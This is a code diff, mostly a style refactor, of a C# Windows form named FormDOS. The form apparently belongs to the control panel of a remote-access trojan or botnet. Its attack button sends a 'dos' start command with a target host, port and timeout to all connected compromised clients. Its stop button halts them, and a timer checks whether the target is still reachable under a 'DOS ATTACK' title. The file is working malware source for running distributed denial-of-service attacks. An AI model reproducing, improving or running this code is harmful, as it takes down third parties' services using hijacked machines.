@@ -1,29 +1,23 @@
-﻿using Server.MessagePack;
-using Server.Connection;
-using System;
+﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
-using System.Drawing;
-using System.Linq;
 using System.Net;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.IO;
+using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Forms
 {
     public partial class FormDOS : Form
     {
-        private TimeSpan timespan;
-        private Stopwatch stopwatch;
-        private string status = "is online";
-        public object sync = new object();
-        public List<Clients> selectedClients = new List<Clients>();
         public List<Clients> PlguinClients = new List<Clients>();
+        public List<Clients> selectedClients = new List<Clients>();
+        private string status = "is online";
+        private Stopwatch stopwatch;
+        public object sync = new object();
+        private TimeSpan timespan;
+
         public FormDOS()
         {
             InitializeComponent();
@@ -31,28 +25,31 @@ namespace Server.Forms
 
         private void BtnAttack_Click(object sender, EventArgs e)
         {
-            if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) || string.IsNullOrWhiteSpace(txtTimeout.Text)) return;
+            if (string.IsNullOrWhiteSpace(txtHost.Text) || string.IsNullOrWhiteSpace(txtPort.Text) ||
+                string.IsNullOrWhiteSpace(txtTimeout.Text)) return;
 
             try
             {
                 if (!txtHost.Text.ToLower().StartsWith("http://")) txtHost.Text = "http://" + txtHost.Text;
                 new Uri(txtHost.Text);
             }
-            catch { return; }
+            catch
+            {
+                return;
+            }
 
             if (PlguinClients.Count > 0)
-            {
                 try
                 {
                     btnAttack.Enabled = false;
-                    MsgPack msgpack = new MsgPack();
+                    var msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "dos";
                     msgpack.ForcePathObject("Option").AsString = "postStart";
                     msgpack.ForcePathObject("Host").AsString = txtHost.Text;
                     msgpack.ForcePathObject("Port").AsString = txtPort.Text;
                     msgpack.ForcePathObject("Timeout").AsString = txtTimeout.Text;
 
-                    foreach (Clients clients in PlguinClients)
+                    foreach (var clients in PlguinClients)
                     {
                         selectedClients.Add(clients);
                         ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
@@ -65,22 +62,21 @@ namespace Server.Forms
                     timer1.Start();
                     timer2.Start();
                 }
-                catch { }
-            }
+                catch
+                {
+                }
         }
 
         private void BtnStop_Click(object sender, EventArgs e)
         {
             try
             {
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "dos";
                 msgpack.ForcePathObject("Option").AsString = "postStop";
 
-                foreach (Clients clients in PlguinClients)
-                {
+                foreach (var clients in PlguinClients)
                     ThreadPool.QueueUserWorkItem(clients.Send, msgpack.Encode2Bytes());
-                }
                 selectedClients.Clear();
                 btnAttack.Enabled = true;
                 btnStop.Enabled = false;
@@ -88,12 +84,15 @@ namespace Server.Forms
                 timer2.Stop();
                 status = "is online";
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
-            this.Text = $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
+            Text =
+                $"DOS ATTACK:{timespan.Subtract(TimeSpan.FromSeconds(stopwatch.Elapsed.Seconds))}    Status:host {status}";
             if (timespan < stopwatch.Elapsed)
             {
                 btnAttack.Enabled = true;
@@ -108,8 +107,8 @@ namespace Server.Forms
         {
             try
             {
-                WebRequest req = WebRequest.Create(new Uri(txtHost.Text));
-                WebResponse res = req.GetResponse();
+                var req = WebRequest.Create(new Uri(txtHost.Text));
+                var res = req.GetResponse();
                 res.Dispose();
                 status = "is online";
             }
@@ -123,16 +122,16 @@ namespace Server.Forms
         {
             try
             {
-                foreach (Clients clients in PlguinClients)
-                {
-                    clients.Disconnected();
-                }
+                foreach (var clients in PlguinClients) clients.Disconnected();
                 PlguinClients.Clear();
                 selectedClients.Clear();
             }
-            catch { }
-            this.Hide();
-            this.Parent = null;
+            catch
+            {
+            }
+
+            Hide();
+            Parent = null;
             e.Cancel = true;
         }
     }
